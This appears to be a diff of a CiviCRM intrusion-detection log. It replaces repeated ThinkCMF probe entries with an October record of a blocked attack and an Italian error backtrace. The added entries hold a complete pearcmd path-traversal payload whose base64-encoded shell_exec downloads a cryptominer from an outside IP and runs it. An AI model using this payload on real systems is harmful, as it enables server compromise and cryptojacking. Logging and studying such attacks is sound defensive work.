@@ -1,493 +1,61 @@
-Jul 11 23:57:15  [info] $IDS Detector Details = Array
+Oct 03 19:07:27  [info] $IDS Detector Details = Array
 (
     [0] => Array
         (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
+            [name] => lang
+            [value] => ../../../../../../../../usr/local/lib/php/pearcmd
+            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
             [userid] => 
-            [session] => t-NoTBQ2dXndjGi3Asow8XG_iPknjDjbqUr6LT-fpZs
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
+            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
+            [ip] => 10.198.0.11
+            [reaction] => 3
+            [impact] => 81
         )
 
     [1] => Array
         (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
+            [name] => /<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ
+            [value] => ="));?> /tmp/ohhellohttpserver.php
+            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
             [userid] => 
-            [session] => t-NoTBQ2dXndjGi3Asow8XG_iPknjDjbqUr6LT-fpZs
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
+            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
+            [ip] => 10.198.0.11
+            [reaction] => 3
+            [impact] => 81
+        )
+
+    [2] => Array
+        (
+            [name] => IDS_request_uri
+            [value] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
+            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
+            [userid] => 
+            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
+            [ip] => 10.198.0.11
+            [reaction] => 3
+            [impact] => 81
         )
 
 )
 
 
-Jul 13 01:31:56  [info] $IDS Detector Details = Array
+Oct 03 19:07:27  [info] $Fatal Error Details = Array
 (
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => pvLfwajd4Gj_DrgapY-kbB5QV4U0J5IKcFGswym1zAM
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => pvLfwajd4Gj_DrgapY-kbB5QV4U0J5IKcFGswym1zAM
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
+    [message] => C'è un errore di convalida con il vostro input HTML. La vostra attività è un po 'sospettoso, quindi annullarla
+    [code] => 
 )
 
 
-Jul 14 04:50:53  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => 1U910xm5JRE8_pHwjKL1z7HhCbLCYE0TQlNwIKinj10
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => 1U910xm5JRE8_pHwjKL1z7HhCbLCYE0TQlNwIKinj10
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 15 08:00:08  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => hBJD2l6mdoK4RL0SI1QNznGMNFN6boKy-VgtFfNzfqI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => hBJD2l6mdoK4RL0SI1QNznGMNFN6boKy-VgtFfNzfqI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 16 21:03:44  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => REH8JlvvYJXbAUPaygqbMlholroxh4qlUFu_nkGgL8o
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => REH8JlvvYJXbAUPaygqbMlholroxh4qlUFu_nkGgL8o
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 18 01:28:41  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => F2MbJK9DcuPs-hCbzlOf6j7jTk-jxt3BNk5p3VyJ5Qc
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => F2MbJK9DcuPs-hCbzlOf6j7jTk-jxt3BNk5p3VyJ5Qc
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 19 05:13:02  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => hfOMRlDfBDJMycMcOemW_sXyXlAUGjcaEobtmQYhWcA
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => hfOMRlDfBDJMycMcOemW_sXyXlAUGjcaEobtmQYhWcA
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 20 07:00:13  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => oo7pxhr-lNcDrt65piZJB3I_PRK8ycbG9pnJcQDbPME
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => oo7pxhr-lNcDrt65piZJB3I_PRK8ycbG9pnJcQDbPME
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 21 07:48:17  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => fw4mMP0RXWNc3vXxbKHuZpNCy0QvXttUmYuLGZGR21w
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => fw4mMP0RXWNc3vXxbKHuZpNCy0QvXttUmYuLGZGR21w
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 22 04:40:05  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => gwlOY5JmFD51ifjosZvuitMfufY7GqUfnCUY_DtVpCE
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => gwlOY5JmFD51ifjosZvuitMfufY7GqUfnCUY_DtVpCE
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 23 10:12:55  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => S4NfIfJZIs-w-72xRvBKjZBrEYk5UfViRGtFonJRLVA
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => S4NfIfJZIs-w-72xRvBKjZBrEYk5UfViRGtFonJRLVA
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 25 08:54:38  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => gIo0qC7cv4W5jE0BvtY2XOJnplCDNZkBKIZcP-mtIcI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => gIo0qC7cv4W5jE0BvtY2XOJnplCDNZkBKIZcP-mtIcI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 26 13:07:01  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => n2-0Tq4_ZbNOjLOPPzTC92UWx32EZd0GiM2m9AACpTc
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => n2-0Tq4_ZbNOjLOPPzTC92UWx32EZd0GiM2m9AACpTc
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 27 08:32:50  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => TBjMErd-DYN3jsUSUoNTgnh6RzbTYavOU0RY41ZSfPE
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => TBjMErd-DYN3jsUSUoNTgnh6RzbTYavOU0RY41ZSfPE
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 28 05:47:07  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => 2Kssr2YffZ5TfaPvS81-oWdm-mVCwErLeDMwXuw8jCI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => 2Kssr2YffZ5TfaPvS81-oWdm-mVCwErLeDMwXuw8jCI
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 29 18:10:22  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => w37bKWI5OLLiRv0fAp61Zpu-MdM6eUtpdYOdoy2WDo0
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => w37bKWI5OLLiRv0fAp61Zpu-MdM6eUtpdYOdoy2WDo0
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
-
-
-Jul 31 01:59:46  [info] $IDS Detector Details = Array
-(
-    [0] => Array
-        (
-            [name] => content
-            [value] => <php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => xVS6my5jWliovOv8juiqv7M10F9C0HKcroA9jamvvRQ
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-    [1] => Array
-        (
-            [name] => IDS_request_uri
-            [value] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [page] => /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
-            [userid] => 
-            [session] => xVS6my5jWliovOv8juiqv7M10F9C0HKcroA9jamvvRQ
-            [ip] => 10.198.0.3
-            [reaction] => 0
-            [impact] => 44
-        )
-
-)
+Oct 03 19:07:27  [info] $backTrace = #0 /var/www/html/sites/all/modules/civicrm/CRM/Core/Error.php(381): CRM_Core_Error::backtrace("backTrace", TRUE)
+#1 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(312): CRM_Core_Error::fatal("C'è un errore di convalida con il vostro input HTML. La vostra attività è un ...")
+#2 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(223): CRM_Core_IDS->kick()
+#3 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(85): CRM_Core_IDS->react(Object(IDS_Report))
+#4 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(197): CRM_Core_IDS->check((Array:13))
+#5 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(84): CRM_Core_Invoke::runItem((Array:13))
+#6 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(52): CRM_Core_Invoke::_invoke((Array:1))
+#7 /var/www/html/sites/all/modules/civicrm/drupal/civicrm.module(445): CRM_Core_Invoke::invoke((Array:1))
+#8 /var/www/html/includes/menu.inc(527): civicrm_invoke()
+#9 /var/www/html/index.php(21): menu_execute_active_handler()
+#10 {main}
 
 
